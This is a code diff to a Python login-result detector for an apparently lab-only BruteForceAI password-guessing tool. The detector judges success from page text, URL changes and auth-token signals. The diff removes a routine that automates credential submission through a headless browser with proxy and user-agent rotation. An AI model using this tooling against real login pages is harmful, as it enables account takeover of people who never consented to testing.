@@ -1,56 +1,32 @@
-"""Multi-signal login result detector for the isolated BruteForceAI lab service.
+"""Multi-signal result helper for the isolated BruteForceAI lab service.
 
-The upstream detector compares only serialized DOM lengths. SPA applications can
-keep that length unchanged after a successful login, producing false negatives.
-This patch keeps the upstream attack workflow but evaluates several independent,
-non-secret browser signals after submit.
+Only the upstream success decision calls this module. Browser launch, selectors,
+retry, delay, persistence, and the analyze/attack workflow remain upstream.
 """
 
 from __future__ import annotations
 
 from dataclasses import dataclass
 import hashlib
-import json
 import os
 import re
 import time
 from typing import Any
 from urllib.parse import urlsplit, urlunsplit
 
+
 SUCCESS_TERMS = (
-    "dashboard",
-    "welcome",
-    "log out",
-    "logout",
-    "sign out",
-    "my profile",
-    "my account",
-    "xin chào",
-    "đăng xuất",
-    "trang quản trị",
+    "dashboard", "welcome", "log out", "logout", "sign out",
+    "my profile", "my account", "xin chào", "đăng xuất", "trang quản trị",
 )
 FAILURE_TERMS = (
-    "invalid credentials",
-    "incorrect password",
-    "wrong password",
-    "login failed",
-    "authentication failed",
-    "access denied",
-    "invalid email or password",
-    "không chính xác",
-    "sai mật khẩu",
-    "đăng nhập thất bại",
-    "tài khoản hoặc mật khẩu không đúng",
-    "thông tin đăng nhập không hợp lệ",
+    "invalid credentials", "incorrect password", "wrong password", "login failed",
+    "authentication failed", "access denied", "invalid email or password",
+    "không chính xác", "sai mật khẩu", "đăng nhập thất bại",
+    "tài khoản hoặc mật khẩu không đúng", "thông tin đăng nhập không hợp lệ",
 )
 AUTH_NAME_HINTS = (
-    "auth",
-    "token",
-    "session",
-    "jwt",
-    "access",
-    "refresh",
-    "supabase",
+    "auth", "token", "session", "jwt", "access", "refresh", "supabase",
 )
 
 
@@ -280,136 +256,3 @@ def wait_for_spa_result(
         last_snapshot = capture_page_snapshot(page, username_selector, password_selector)
         result = evaluate_snapshots(before, last_snapshot, failed_dom_length, dom_threshold)
     return result
-
-
-def _attempt_login_multisignal(self: Any, url: str, selectors_data: dict, username: str, password: str) -> bool:
-    from playwright.sync_api import sync_playwright
-
-    max_retries = self.retry_attempts
-    retry_delay = 2
-
-    for attempt in range(max_retries):
-        start_time = time.time()
-        try:
-            with sync_playwright() as playwright:
-                browser = playwright.chromium.launch(
-                    headless=not self.show_browser,
-                    slow_mo=100 if self.show_browser else 0,
-                )
-                context_args: dict[str, Any] = {"ignore_https_errors": True}
-                if self.proxy:
-                    context_args["proxy"] = {"server": self.proxy}
-                random_user_agent = self._get_random_user_agent()
-                if random_user_agent:
-                    context_args["user_agent"] = random_user_agent
-
-                context = browser.new_context(**context_args)
-                page = context.new_page()
-                page.goto(url, timeout=30000)
-                try:
-                    page.wait_for_load_state("networkidle", timeout=10000)
-                except Exception:
-                    pass
-
-                username_selector = selectors_data.get("login_username_selector")
-                password_selector = selectors_data.get("login_password_selector")
-                submit_selector = selectors_data.get("login_submit_button_selector")
-                before = capture_page_snapshot(page, username_selector, password_selector)
-
-                if username_selector:
-                    page.locator(username_selector).first.clear()
-                    page.locator(username_selector).first.fill(username)
-                if password_selector:
-                    page.locator(password_selector).first.clear()
-                    page.locator(password_selector).first.fill(password)
-                if submit_selector:
-                    page.locator(submit_selector).first.click()
-
-                detection = wait_for_spa_result(
-                    page,
-                    before,
-                    username_selector,
-                    password_selector,
-                    selectors_data.get("failed_dom_length"),
-                    self.dom_threshold,
-                )
-                diagnostic = {
-                    "success": detection.success,
-                    "score": detection.score,
-                    "signals": [name for name, enabled in detection.signals.items() if enabled],
-                    "before_url": detection.safe_before_url,
-                    "after_url": detection.safe_after_url,
-                    "failed_dom_difference": detection.failed_dom_difference,
-                }
-                print("   🧭 BreachSentinel multi-signal detector: " + json.dumps(diagnostic, ensure_ascii=True))
-
-                response_time_ms = int((time.time() - start_time) * 1000)
-                self._save_brute_force_attempt(
-                    {
-                        "url": url,
-                        "username_or_email": username,
-                        "password": password,
-                        "dom_length": str(detection.current_dom_length),
-                        "failed_dom_length": (
-                            str(selectors_data.get("failed_dom_length"))
-                            if selectors_data.get("failed_dom_length")
-                            else None
-                        ),
-                        "success": detection.success,
-                        "response_time_ms": response_time_ms,
-                        "playwright_or_requests": "playwright-multisignal",
-                        "proxy_server": self.proxy,
-                        "external_ip": self.external_ip,
-                    }
-                )
-                browser.close()
-                return detection.success
-        except Exception as exc:
-            error_message = str(exc)
-            network_errors = (
-                "ERR_CONNECTION_REFUSED",
-                "ERR_NETWORK_CHANGED",
-                "ERR_INTERNET_DISCONNECTED",
-                "ERR_CONNECTION_TIMED_OUT",
-                "ERR_CONNECTION_RESET",
-                "net::ERR_",
-                "TimeoutError",
-                "Connection refused",
-                "Connection timed out",
-            )
-            is_network_error = any(value in error_message for value in network_errors)
-            if is_network_error and attempt < max_retries - 1:
-                print(
-                    f"   🔄 Network error (attempt {attempt + 1}/{max_retries}): "
-                    f"{error_message[:100]}"
-                )
-                time.sleep(retry_delay)
-                continue
-
-            print(f"   ❌ Error during multi-signal login detection: {error_message[:100]}")
-            self._save_brute_force_attempt(
-                {
-                    "url": url,
-                    "username_or_email": username,
-                    "password": password,
-                    "dom_length": None,
-                    "failed_dom_length": selectors_data.get("failed_dom_length"),
-                    "success": False,
-                    "response_time_ms": int((time.time() - start_time) * 1000),
-                    "playwright_or_requests": "playwright-multisignal",
-                    "proxy_server": self.proxy,
-                    "external_ip": self.external_ip,
-                }
-            )
-            return False
-    return False
-
-
-def install_patch() -> None:
-    """Patch only the result detector; upstream analyze/attack flow stays intact."""
-    import BruteForceCore
-
-    if getattr(BruteForceCore.BruteForceAI, "_bs_multisignal_installed", False):
-        return
-    BruteForceCore.BruteForceAI._attempt_login = _attempt_login_multisignal
-    BruteForceCore.BruteForceAI._bs_multisignal_installed = True
